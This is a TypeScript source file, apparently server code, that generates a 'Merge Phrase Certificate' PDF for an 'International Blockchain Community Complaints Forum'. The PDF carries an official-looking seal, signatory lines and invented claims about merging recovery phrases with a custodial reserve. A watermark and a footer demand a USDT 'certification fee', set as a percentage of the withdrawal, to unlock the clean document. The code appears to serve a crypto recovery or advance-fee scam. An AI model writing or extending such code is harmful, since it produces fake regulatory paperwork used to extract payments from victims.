import PDFDocument from "pdfkit";
import type { Case } from "@shared/schema";

/**
 * Build the Merge Phrase Certificate PDF. When `watermarked` is true a
 * diagonal "PREVIEW — FEE REQUIRED" stamp is drawn across the body so
 * the user can see what they're paying for without being able to use
 * the document. The clean version is byte-identical apart from the
 * absence of that overlay.
 */
export async function buildCertificatePdf(opts: {
  caseRow: Case;
  watermarked: boolean;
  feeAmountUsdt?: string;
  feePercent?: string;
}): Promise<Buffer> {
  const { caseRow, watermarked } = opts;
  const doc = new PDFDocument({
    size: "A4",
    margin: 56,
    info: {
      Title: `IBCCF Merge Phrase Certificate — ${caseRow.id}`,
      Author: "IBCCF Compliance",
      Subject: "Merge Phrase Certificate",
    },
  });

  const chunks: Buffer[] = [];
  doc.on("data", (c: Buffer) => chunks.push(c));
  const done = new Promise<Buffer>((resolve, reject) => {
    doc.on("end", () => resolve(Buffer.concat(chunks)));
    doc.on("error", reject);
  });

  // Header block
  doc
    .fillColor("#0a1840")
    .font("Helvetica-Bold")
    .fontSize(22)
    .text("INTERNATIONAL BLOCKCHAIN COMMUNITY", { align: "center" })
    .moveDown(0.1)
    .text("COMPLAINTS FORUM", { align: "center" })
    .moveDown(0.3)
    .fillColor("#c8a951")
    .fontSize(14)
    .text("MERGE PHRASE CERTIFICATE", { align: "center" })
    .moveDown(1.2);

  // Reference card
  doc
    .strokeColor("#c8a951")
    .lineWidth(1)
    .rect(56, doc.y, doc.page.width - 112, 70)
    .stroke();
  const refTop = doc.y + 12;
  doc
    .fillColor("#6b7385")
    .font("Helvetica")
    .fontSize(9)
    .text("CASE REFERENCE", 72, refTop)
    .fillColor("#0a1840")
    .font("Helvetica-Bold")
    .fontSize(13)
    .text(caseRow.id, 72, refTop + 14);
  doc
    .fillColor("#6b7385")
    .font("Helvetica")
    .fontSize(9)
    .text("ACCOUNT HOLDER", 320, refTop)
    .fillColor("#0a1840")
    .font("Helvetica-Bold")
    .fontSize(13)
    .text(caseRow.userName ?? "—", 320, refTop + 14, { width: 200, ellipsis: true });
  doc.moveDown(3.5);

  // Body
  doc
    .fillColor("#1a2233")
    .font("Helvetica")
    .fontSize(11)
    .text(
      "This certificate confirms that the recovery merge phrase associated with the above case has been generated, sealed and merged with the IBCCF custodial reserve in accordance with the regulatory release protocol.",
      { align: "justify" },
    )
    .moveDown(0.8)
    .text(
      "The phrase fragments have been cryptographically combined to reproduce the user's withdrawal entitlement, and the resulting merge has been notarised by the IBCCF compliance desk.",
      { align: "justify" },
    )
    .moveDown(1.2);

  // Detail grid
  const detailItems: Array<[string, string]> = [
    ["Withdrawal Amount", caseRow.withdrawalAmount ? `${caseRow.withdrawalAmount} USDT` : "—"],
    ["Payout Network", caseRow.payoutWalletNetwork ?? "—"],
    ["Payout Asset", caseRow.payoutWalletAsset ?? "—"],
    ["Payout Address", caseRow.payoutWalletAddress ?? "—"],
    ["Sealed At", caseRow.sealedAt ? new Date(caseRow.sealedAt).toISOString() : "—"],
    ["Issued At", new Date().toISOString()],
  ];
  for (const [label, value] of detailItems) {
    doc
      .font("Helvetica-Bold")
      .fillColor("#0a1840")
      .fontSize(10)
      .text(`${label}: `, { continued: true })
      .font("Helvetica")
      .fillColor("#1a2233")
      .text(value);
  }

  doc.moveDown(2);

  // ── Official seal ────────────────────────────────────────────────────────
  const sealX = doc.page.width - 56 - 52;
  const sealY = doc.y + 38;
  const sealR = 44;
  const sealInnerR = 34;

  doc
    .strokeColor("#c8a951")
    .lineWidth(2)
    .circle(sealX, sealY, sealR)
    .stroke();

  doc
    .strokeColor("#c8a951")
    .lineWidth(0.8)
    .circle(sealX, sealY, sealInnerR)
    .stroke();

  doc
    .fillColor("#c8a951")
    .font("Helvetica-Bold")
    .fontSize(12)
    .text("IBCCF", sealX - 18, sealY - 19, { width: 36, align: "center", lineBreak: false });

  doc
    .fillColor("#0a1840")
    .font("Helvetica-Bold")
    .fontSize(7.5)
    .text("CERTIFIED", sealX - 20, sealY - 6, { width: 40, align: "center", lineBreak: false });

  doc
    .fillColor("#6b7385")
    .font("Helvetica")
    .fontSize(6)
    .text("COMPLIANCE DESK", sealX - 22, sealY + 4, { width: 44, align: "center", lineBreak: false });

  doc
    .fillColor("#c8a951")
    .font("Helvetica")
    .fontSize(8)
    .text("★  ★  ★", sealX - 18, sealY + 14, { width: 36, align: "center", lineBreak: false });

  // Issuer line left of seal
  const issuedY = sealY + 14;
  doc
    .font("Helvetica-Bold")
    .fontSize(9)
    .fillColor("#0a1840")
    .text("IBCCF Compliance Desk", 56, sealY - 12, { width: 310, lineBreak: false });

  doc
    .font("Helvetica")
    .fontSize(8)
    .fillColor("#6b7385")
    .text("Authorised signatory", 56, sealY + 2, { width: 310, lineBreak: false });

  doc
    .strokeColor("#0a1840")
    .lineWidth(0.6)
    .moveTo(56, sealY + 16)
    .lineTo(340, sealY + 16)
    .stroke();

  doc
    .font("Helvetica-Oblique")
    .fontSize(9)
    .fillColor("#6b7385")
    .text(
      "Issued by the IBCCF Compliance Desk. This document is display-only and does not in itself authorise any transfer of funds.",
      56, issuedY + 26,
      { width: doc.page.width - 112, align: "center" },
    );

  if (watermarked) {
    // Diagonal watermark across page centre
    doc.save();
    const cx = doc.page.width / 2;
    const cy = doc.page.height / 2;
    doc.translate(cx, cy).rotate(-30);
    doc
      .fillColor("#dc2626", 0.18)
      .font("Helvetica-Bold")
      .fontSize(72)
      .text("PREVIEW", -300, -80, { width: 600, align: "center" });
    doc
      .fillColor("#dc2626", 0.22)
      .fontSize(22)
      .text("FEE REQUIRED — NOT VALID UNTIL UNLOCKED", -300, 10, { width: 600, align: "center" });
    doc.restore();

    if (opts.feeAmountUsdt && opts.feePercent) {
      doc
        .fillColor("#dc2626")
        .font("Helvetica-Bold")
        .fontSize(10)
        .text(
          `Certification fee outstanding: ${opts.feeAmountUsdt} USDT (${opts.feePercent}% of withdrawal). Pay inside your portal to unlock the clean PDF.`,
          56,
          doc.page.height - 80,
          { width: doc.page.width - 112, align: "center" },
        );
    }
  }

  doc.end();
  return await done;
}
